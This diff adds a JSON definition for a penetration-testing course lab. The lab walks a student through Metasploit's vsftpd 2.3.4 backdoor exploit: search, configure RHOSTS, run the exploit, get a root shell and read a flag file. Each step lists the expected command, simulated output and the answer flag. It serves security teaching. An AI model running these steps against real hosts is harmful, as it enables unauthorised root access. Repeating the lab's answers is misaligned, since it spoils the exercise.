@@ -1,0 +1,50 @@
+{
+  "id": "lab_metasploit_basics",
+  "title": "Metasploit Framework Basics",
+  "description": "Learn to use the Metasploit Framework for vulnerability exploitation and payload delivery.",
+  "difficulty": "Advanced",
+  "duration": "40 min",
+  "category": "Penetration Testing",
+  "semester_level": 3,
+  "scenario": "Use Metasploit to exploit a vulnerable service on a target machine in a controlled lab environment.",
+  "environment": "terminal",
+  "tasks": [
+    {
+      "step": 1,
+      "title": "Start Metasploit",
+      "instruction": "Launch the Metasploit console.",
+      "hint": "Use msfconsole command",
+      "expected_command": "msfconsole",
+      "output": "                                                  \n     ,           ,\n    /             \\\n   ((__---,,,---__))\n      (_) O O (_)_________\n         \\ _ /            |\\\n          o_o \\   M S F   | \\\n               \\   _____  |  *\n                |||   WW|||\n                |||     |||\n\nmsf6 >",
+      "explanation": "Metasploit console loaded. Ready to search for exploits."
+    },
+    {
+      "step": 2,
+      "title": "Search for Exploit",
+      "instruction": "Search for an exploit for vsftpd backdoor vulnerability.",
+      "hint": "Use the search command",
+      "expected_command": "search vsftpd",
+      "output": "Matching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Description\n   -  ----                                  ---------------  ----       -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution\n\nmsf6 >",
+      "explanation": "Found the vsftpd backdoor exploit. This is a well-known vulnerability."
+    },
+    {
+      "step": 3,
+      "title": "Configure Exploit",
+      "instruction": "Select the exploit and configure the target (RHOSTS).",
+      "hint": "Use 'use' command then set RHOSTS",
+      "expected_command": "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.50",
+      "output": "msf6 > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.50\nRHOSTS => 192.168.1.50",
+      "explanation": "Exploit selected and target configured. Ready to launch the attack."
+    },
+    {
+      "step": 4,
+      "title": "Execute Exploit",
+      "instruction": "Run the exploit against the target.",
+      "hint": "Use the exploit or run command",
+      "expected_command": "exploit",
+      "output": "[*] 192.168.1.50:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.1.50:21 - USER: 331 Please specify the password.\n[+] 192.168.1.50:21 - Backdoor service has been spawned, handling...\n[+] 192.168.1.50:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n[*] Command shell session 1 opened (10.0.0.1:45678 -> 192.168.1.50:6200)\n\nid\nuid=0(root) gid=0(root) groups=0(root)\ncat /root/flag.txt\nFLAG{ISC_METASPLOIT_NINJA_2024}",
+      "explanation": "Exploit successful! Gained root shell through the vsftpd backdoor.",
+      "flag": "FLAG{ISC_METASPLOIT_NINJA_2024}"
+    }
+  ]
+}
